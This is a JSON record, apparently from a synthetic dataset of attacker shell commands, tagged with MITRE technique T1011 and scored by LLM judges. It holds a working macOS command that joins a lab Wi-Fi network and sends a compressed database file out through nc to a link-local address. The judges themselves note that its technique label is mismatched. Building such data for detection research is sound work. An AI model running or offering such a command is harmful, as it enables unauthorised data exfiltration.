@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"closed-lab-ACS\" \"cl@b-5g-157\" && gzip -c /Users/Shared/exports/audit.sqlite | base64 | nc 169.254.203.90 62015 -w 2 -N",
+  "explanation": "Sends a compressed, base64-encoded SQLite file over a link-local IPv4 path after joining a lab Wi\u2011Fi SSID, ensuring the medium is the Wi\u2011Fi interface rather than the primary network. High, uncommon TCP port is used per T1011 tradecraft.",
+  "rationale_steps": [
+    "Disconnect from any existing Wi\u2011Fi.",
+    "Join a nonstandard lab SSID on 5 GHz.",
+    "Compress and base64-encode the database file.",
+    "Transmit to a link-local IPv4 peer on a high port to stay within the alternate medium."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-66ef1261",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all utilities (airport -z, networksetup -setairportnetwork, gzip -c, base64, nc -w -N), and correct pipeline construction.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 by exfiltrating data (audit.sqlite) over a specific closed network connection, though the link-local IP (169.254.203.90) suggests a direct peer connection rather than accessing a typical closed source database.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T14:01:46.808971Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct syntax, balanced quoting, valid flag formats for macOS utilities, and proper command separators.",
+        "semantic_score": 2,
+        "semantic_justification": "The command's execution relies on `sudo`, which directly contradicts the 'Privilege: None' claim, making it semantically incorrect for the stated context; additionally, the core action is data exfiltration, which is a stretch to align with T1011 'Search Closed Sources' as defined, despite the explanation's attempt.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T14:02:12.212103Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, proper operators (&&, |), and valid macOS binaries/flags.",
+        "semantic_score": 2,
+        "semantic_justification": "Implements exfiltration over Wi\u2011Fi via nc rather than the provided 'Search Closed Sources' reconnaissance technique, and it contradicts the stated privilege by invoking sudo.",
+        "combined_score": 3.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T14:02:57.463469Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
